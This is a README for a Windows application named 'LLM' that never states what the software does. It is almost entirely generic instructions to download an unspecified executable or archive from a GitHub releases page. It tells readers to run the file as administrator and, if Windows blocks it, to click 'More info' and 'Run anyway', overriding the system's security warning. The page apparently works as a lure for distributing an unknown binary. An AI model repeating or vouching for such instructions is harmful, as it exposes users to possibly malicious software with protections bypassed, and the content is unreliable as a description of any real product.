# 💡 LLM - Simple tools for everyday use

[![Download LLM](https://img.shields.io/badge/Download-LLM-blue.svg?style=for-the-badge&logo=github)](https://github.com/effecterelectricalplant87/LLM/releases)

## 🖥️ What is LLM?

LLM is a Windows app you can download and run from the release page. It is built for end users who want a simple way to use the app without setup work. You do not need programming knowledge to get started.

## 📥 Download LLM

To get LLM, visit the release page and download the latest Windows file from there:

https://github.com/effecterelectricalplant87/LLM/releases

On that page, look for the newest release and download the file that matches Windows. If there is more than one file, choose the one with `.exe` or the Windows archive name.

## 🚀 How to install and run

1. Open the download page.
2. Find the latest release.
3. Download the Windows file.
4. If the file is a `.zip`, open it and extract the contents.
5. If the file is a `.exe`, double-click it to start the app.
6. If Windows asks for permission, select Run or Yes.
7. Follow any on-screen steps until the app opens.

If you placed the app in a folder after extracting it, keep the files together. Do not move one file away from the others.

## 🪟 Windows requirements

LLM is set up for Windows computers. For best results, use:

- Windows 10 or Windows 11
- A recent Intel or AMD processor
- At least 4 GB of RAM
- 200 MB of free disk space
- A stable internet connection for downloading the release file

If your PC is older, the app may still run, but it can start slower.

## 🧭 First-time setup

After you open LLM for the first time:

- Let Windows finish any security check
- Keep the app in a folder you can find later
- If the app creates settings files, leave them in place
- Open the app again from the same file each time

If the app stores data locally, keep the folder in a safe place so your settings stay available.

## 🔧 How to use LLM

LLM is designed to be straightforward. After opening it, you can:

- Start the app from the main file
- Use the main screen to access its features
- Keep the app updated by checking the release page from time to time
- Replace old files with new release files when a new version comes out

If the app opens with a menu, use the items on the screen in order. If it opens with a single window, follow the prompts inside the app.

## 📁 File types you may see

You may find one of these files in the release download:

- `.exe` — a Windows app file you can run
- `.zip` — a compressed folder you need to extract first
- `.msi` — a Windows installer file

If you see a `.zip` file, right-click it and choose Extract All. Then open the extracted folder and run the app file inside.

## 🛠️ Common tasks

### ✅ Open the app
Double-click the main file from the release download.

### 🔄 Update to a newer version
Go back to the release page, download the new version, and replace the old files if needed.

### 🗂️ Move the app
If you want to move LLM to another folder, move the full folder, not a single file.

### 🧹 Remove the app
Delete the folder that contains the app files if you no longer need it. If Windows created shortcuts, remove those too.

## ❓ Help with common problems

### The file does not open
- Make sure the download finished
- Check that you extracted the `.zip` file if one was downloaded
- Try right-clicking the file and choosing Run as administrator

### Windows blocks the app
- Select More info if you see that option
- Then choose Run anyway if you trust the file source
- Make sure you downloaded it from the release page above

### The app closes right away
- Download the file again in case it was damaged
- Check that all files from the release stayed in the same folder
- Try the newest release version

### I cannot find the downloaded file
- Open your Downloads folder
- Sort by date
- Look for the newest file from the release page

## 🔍 Tips for a smooth start

- Use the latest release
- Keep the download in one folder
- Do not rename files unless the app instructions tell you to
- Restart the app if it stops responding
- Check the release page before looking for support files

## 🧾 Version updates

Each new release may include fixes, changes, and better performance. When a new version appears, download it from the release page and use that copy instead of the old one.

## 📦 Download again later

If you need the file again, use the same release page:

https://github.com/effecterelectricalplant87/LLM/releases

## 🧩 Basic workflow

1. Open the release page
2. Download the latest Windows file
3. Extract it if needed
4. Run the app
5. Keep the files together
6. Check back for updates when you want the latest version